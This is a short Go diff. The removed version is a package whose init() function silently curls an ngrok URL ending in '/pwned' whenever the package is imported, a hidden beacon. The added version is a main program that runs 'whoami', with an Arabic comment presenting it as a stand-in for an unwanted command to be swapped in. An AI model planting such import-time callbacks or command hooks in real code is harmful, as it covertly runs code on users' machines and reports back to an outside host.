@@ -1,9 +1,16 @@
-package mypkg
+package main
 
 import (
-	"os/exec"
+    "os"
+    "os/exec"
+    "log"
 )
 
-func init() {
-	exec.Command("curl", "https://ec8c-156-203-96-28.ngrok-free.app/pwned").Run()
+func main() {
+    cmd := exec.Command("whoami")  // مثال لأمر غير مرغوب فيه، يمكنك استبداله بما يناسب
+    out, err := cmd.CombinedOutput()
+    if err != nil {
+        log.Fatal(err)
+    }
+    log.Println(string(out))
 }
